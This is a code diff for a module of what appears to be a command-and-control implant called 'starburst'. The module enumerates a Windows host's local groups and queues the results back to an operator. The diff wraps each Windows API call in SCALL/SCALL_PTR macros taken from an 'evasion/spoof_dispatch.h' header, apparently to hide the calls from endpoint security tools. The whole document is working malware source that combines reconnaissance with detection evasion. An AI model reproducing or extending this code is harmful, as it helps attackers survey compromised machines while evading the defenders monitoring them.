@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_NET_LOCALGROUP
 
@@ -25,7 +26,7 @@ auto declfn starburst::cmd_net_localgroup(
     _In_    Parser*   params
 ) -> void {
     STK_NETAPI32(_n);
-    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_netapi = reinterpret_cast<HMODULE>( SCALL( inst, kernel32.LoadLibraryA, _n ) );
     if ( !h_netapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
@@ -52,7 +53,7 @@ auto declfn starburst::cmd_net_localgroup(
     if ( host_str && host_len > 0 ) {
         char host_buf[256] = { 0 };
         memory::copy( host_buf, host_str, host_len < 255 ? host_len : 255 );
-        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_buf, -1, w_host, 256 );
+        SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, host_buf, -1, w_host, 256 );
         p_host = w_host;
     }
 
@@ -60,7 +61,7 @@ auto declfn starburst::cmd_net_localgroup(
     DWORD entries_read = 0, total_entries = 0;
     DWORD_PTR resume = 0;
 
-    DWORD status = pNetLocalGroupEnum(
+    DWORD status = (DWORD)SCALL_PTR( inst, pNetLocalGroupEnum,
         p_host, 1, &buf, 0xFFFFFFFF,
         &entries_read, &total_entries, &resume );
 
@@ -73,7 +74,7 @@ auto declfn starburst::cmd_net_localgroup(
     uint32_t out_cap = 8192;
     auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
     if ( !output ) {
-        pNetApiBufferFree( buf );
+        SCALL_PTR( inst, pNetApiBufferFree, buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -83,14 +84,14 @@ auto declfn starburst::cmd_net_localgroup(
     auto groups = reinterpret_cast<LOCALGROUP_INFO_1*>( buf );
     for ( DWORD i = 0; i < entries_read && off + 520 < out_cap; i++ ) {
         char name[260] = { 0 };
-        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, groups[i].lgrpi1_name, -1, name, 260, nullptr, nullptr );
+        SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, groups[i].lgrpi1_name, -1, name, 260, nullptr, nullptr );
         uint32_t nlen = str_len( name );
         memory::copy( output + off, name, nlen );
         off += nlen;
 
         if ( groups[i].lgrpi1_comment ) {
             char comment[260] = { 0 };
-            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, groups[i].lgrpi1_comment, -1, comment, 260, nullptr, nullptr );
+            SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, groups[i].lgrpi1_comment, -1, comment, 260, nullptr, nullptr );
             uint32_t clen = str_len( comment );
             if ( clen > 0 ) {
                 for ( uint32_t pad = nlen; pad < 30; pad++ ) output[off++] = ' ';
@@ -102,7 +103,7 @@ auto declfn starburst::cmd_net_localgroup(
     }
 
     output[off] = '\0';
-    pNetApiBufferFree( buf );
+    SCALL_PTR( inst, pNetApiBufferFree, buf );
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
     inst.heap_free( output );
 }
